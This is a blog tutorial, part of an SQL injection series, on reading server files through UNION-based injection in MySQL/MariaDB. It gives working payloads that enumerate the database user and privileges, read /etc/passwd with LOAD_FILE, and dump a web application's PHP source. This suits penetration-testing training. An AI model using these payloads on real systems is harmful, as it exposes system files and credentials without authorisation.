---
title: "SQLi Series - Reading Files through SQL Injection - 08"
seoTitle: "SQL Injection: Reading Files Tutorial"
seoDescription: "Explore how SQL Injection can be used to read and write files on servers, highlighting the importance of user privileges and techniques"
datePublished: Sun Apr 21 2024 19:18:01 GMT+0000 (Coordinated Universal Time)
cuid: clv9wuuko00000ala6ga60cbd
slug: sqli-series-reading-files-through-sql-injection-08
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1713727062162/84a6acf3-3c23-48d6-aa65-a184b3a49225.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1713727065694/7c186fc2-c097-45de-803b-1b431463a95a.png
tags: sqlinjection, redteaming, pente

---

## **Introduction**

* SQL Injection can be used for more than just gathering data from tables and databases
    
* It can also be leveraged to read and write files on the server
    
* In some cases, it can even lead to remote code execution on the back-end server
    

## **Privileges**

* Reading data is more common than writing data
    
* Writing data is strictly reserved for privileged users in modern DBMSes
    
* In MySQL, the DB user must have the FILE privilege to load a file's content into a table and read files
    
* Gathering data about user privileges within the database is important to determine read/write capabilities
    

### Diagram

![](https://imgr.whimsical.com/thumbnails/e3KByHu39W3Q3DKow27cp/FSqG89kjXDYpA2eVKYA2ES align="center")

## **Determining the DB User**

* Finding the current DB user is the first step
    
* Database administrator (DBA) privileges are not always necessary to read data, but are becoming more required in modern DBMSes
    
* DBA privileges increase the likelihood of having file-read privileges
    
* If not a DBA, checking user privileges is crucial to see what actions can be performed
    

Queries to find the current DB user:

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

```

UNION injection payload:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -

```

or

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -

```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1713726897409/f0b017ad-6a59-4899-b5e7-5efd06266094.png align="center")

Example:

* The query reveals the current user is `root`
    
* A `root` user is likely to be a DBA, granting many privileges
    

## **Checking User Privileges**

* After identifying the user, the next step is to check their privileges
    
* Testing for super admin privileges can be done with the following query:
    

```sql
SELECT super_priv FROM mysql.user

```

UNION injection payload:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

```

* If there are multiple users, adding `WHERE user="root"` will show privileges only for the current `root` user:
    

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

```

Example:

* The query returns `Y`, indicating superuser privileges
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1713726914947/32646725-0e52-46e0-beee-83e3107a61f6.png align="left")

* Privileges can also be dumped directly from the schema using the following query:
    

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1713726921027/3f01a254-19ae-408d-89c4-1d45b0efb481.png align="left")

* Adding `WHERE grantee="'root'@'`[`localhost`](http://localhost)`'"` will show privileges only for the current `root` user:
    

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

```

Example:

* The query reveals all privileges granted to the current `root` user
    
* The `FILE` privilege is listed, enabling file read and potentially write access
    

## **Reading Files with LOAD\_FILE**

* The `LOAD_FILE()` function in MariaDB/MySQL can be used to read data from files
    
* It takes the file name as its argument
    
* Example query to read the `/etc/passwd` file:
    

```sql
SELECT LOAD_FILE('/etc/passwd');

```

Note: The file will only be readable if the OS user running MySQL has sufficient privileges.

UNION injection payload:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

```

Example:

* The query successfully reads the contents of the `passwd` file through the SQL injection
    
* This technique can potentially be used to leak application source code as well
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1713726928144/24bd1ca3-d811-4c8e-9b9b-6e584ef2d8a8.png align="left")

## **Reading Application Source Code**

* Knowing the current page is `search.php`, an attempt can be made to read its source code
    
* The default Apache webroot is `/var/www/html`
    

UNION injection payload:

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

```

Example:

* The query retrieves the entire PHP code of `search.php`
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1713726935019/a41928be-ef1e-42f6-bddc-45ed3ebb0732.png align="left")

* The HTML source can be viewed by pressing \[Ctrl + U\]
    
* The source code could be inspected further to find sensitive information like database connection credentials or additional vulnerabilities
    

## **Conclusion**

* SQL Injection is a powerful technique that goes beyond data retrieval
    
* With sufficient privileges, it can be used to read and potentially write files on the server
    
* Determining the current DB user and their privileges is crucial for assessing file read/write capabilities
    
* The `LOAD_FILE()` function in MySQL/MariaDB enables reading files through SQL injection
    
* This technique can be leveraged to leak application source code and uncover sensitive information or vulnerabilities